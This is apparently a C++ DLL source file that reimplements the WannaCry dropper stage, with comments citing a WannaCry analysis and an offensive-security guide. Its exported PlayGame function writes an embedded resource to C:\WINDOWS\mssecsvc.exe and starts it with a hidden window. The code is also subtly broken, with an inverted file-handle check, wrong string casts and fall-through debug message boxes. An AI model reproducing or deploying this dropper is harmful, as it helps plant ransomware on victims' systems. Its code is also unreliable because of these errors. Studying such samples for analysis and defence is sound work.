// dllmain.cpp : Defines the entry point for the DLL application.
#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <stdio.h>

//assistance from: 
//https://blog.kartone.ninja/2019/05/23/malware-analysis-a-wannacry-sample-found-in-the-wild/
//https://www.programmersought.com/article/5646318912/
//https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
//https://cboard.cprogramming.com/windows-programming/117578-hmodule-current-dll.html
//https://stackoverflow.com/questions/13408306/including-a-text-file-as-a-local-resource-in-an-exe 
//https://docs.microsoft.com/en-us/windows/win32/procthread/creating-processes

extern "C" VOID __declspec(dllexport) PlayGame();
int ExtractAndCreate();
int RunProcess();

//global
char szDest[MAX_PATH];
HMODULE hInstDLL;

extern "C" VOID __declspec(dllexport) PlayGame()
{
    sprintf(szDest, "C:\\%s\\%s", "WINDOWS", "mssecsvc.exe");
    ExtractAndCreate();
    RunProcess();
}

int ExtractAndCreate()
{
    HRSRC hSrc;
    HANDLE hFile;
    DWORD NumberOfBytesToWrite = 0;
    DWORD ResourceSize;
    HGLOBAL hResourceData;
    PVOID pRsrc;
    hSrc = FindResourceA(hInstDLL, (LPCSTR)101, "W");
    hResourceData = LoadResource(hInstDLL, hSrc);
    pRsrc = LockResource(hResourceData);
    ResourceSize = SizeofResource(hInstDLL, hSrc);

    //dwFlagsAndTrributes = 4
    //find out whatever 0x40000000 is
    //UPDATE: GENERIC_WRITE is 0x40000000
    hFile = CreateFileA(szDest, 0x40000000, 2, 0, 2, 4, 0);
    if (!hFile)
    {
        //+4 to skip the DWORD length that's written before the actual resource
        WriteFile(hFile, (PVOID*)pRsrc + 4, ResourceSize, &NumberOfBytesToWrite, NULL);
        CloseHandle(hFile);
    }
    return 0;
}

int RunProcess()
{
    PROCESS_INFORMATION ProcessInformation;
    STARTUPINFOA StartupInfo;
    ProcessInformation.hProcess = 0;
    ProcessInformation.hThread = 0;
    ProcessInformation.dwProcessId = 0;
    memset(&StartupInfo.lpReserved, 0, sizeof(StartupInfo));
    StartupInfo.cb = 104;
    StartupInfo.wShowWindow = 0;
    StartupInfo.dwFlags = 129;
    //ZeroMemory(&StartupInfo, sizeof(StartupInfo));
   // StartupInfo.cb = sizeof(StartupInfo);
    //ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));
    if(CreateProcess(NULL, (LPWSTR)szDest, NULL, NULL, FALSE, 0, NULL, NULL, (LPSTARTUPINFOW)&StartupInfo, &ProcessInformation))
    {
        CloseHandle(ProcessInformation.hThread);
        CloseHandle(ProcessInformation.hProcess);
    }
    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    hInstDLL = hModule;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        //for testing purposes; remove in final version
        MessageBoxA(NULL, "DLL_PROCESS_ATTACH", "DLL_PROCESS_ATTACH", MB_OK);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        //for testing purposes; remove in final version
        MessageBoxA(NULL, "DLL_PROCESS_DETACH", "DLL_PROCESS_DETACH", MB_OK);
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
